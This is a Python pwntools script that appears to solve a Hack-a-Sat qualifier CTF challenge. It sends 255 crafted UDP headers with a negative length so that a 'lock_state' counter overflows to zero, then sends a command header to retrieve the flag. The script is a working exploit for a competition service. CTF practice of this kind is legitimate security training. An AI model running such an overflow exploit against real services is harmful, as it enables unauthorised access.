
import os
import re
import sys
import time
import logging

from pwn import *

logger = logging.getLogger(__name__)

# Used for testing locally
LOCAL = ('127.0.0.1', 54321)
# Used for the HAS quals
REMOTE = ('18.118.161.198', '17434')
# Required ticket when connecting to the HAS service
TICKET = 'ticket{xxx}'

# Solving logic for the challenge
def do_challenge(remote):
    overflow = bytearray()
    # Create a bytearray of 1, 1 and -8
    overflow += struct.pack('HHi', 1, 1, -8)
    
    # Send 255 headers to overflow the `lock_state` to 0
    for i in range(1, 256):
        remote.sendline(overflow)
        line = remote.recv().decode('utf-8')
        print(f"[*] << {line.rstrip()}")

    # Create the command header to get the flag
    flag = bytearray()
    flag += struct.pack('HHI', 1, 1, 9)
    remote.sendline(flag)
    # Bring home the flag
    while remote.can_recv(1):
        line = remote.recv().decode('utf-8')
        print(f"[*] << {line.rstrip()}")

if __name__ == '__main__':
    # Specifies which host to connect to: LOCAL/REMOTE
    host = LOCAL
    # Open a connection to the service using UDP
    remote = remote(host[0], host[1], typ='udp')

    # Send ticket if launching against the REMOTE service
    if host == REMOTE:
        remote.recvuntil('Ticket please:')
        logger.info(f'Sending ticket to {REMOTE[0]}:{REMOTE[1]}...')
        remote.sendline(str(TICKET))

    # Complete the challenge
    do_challenge(remote)

    sys.exit(0)
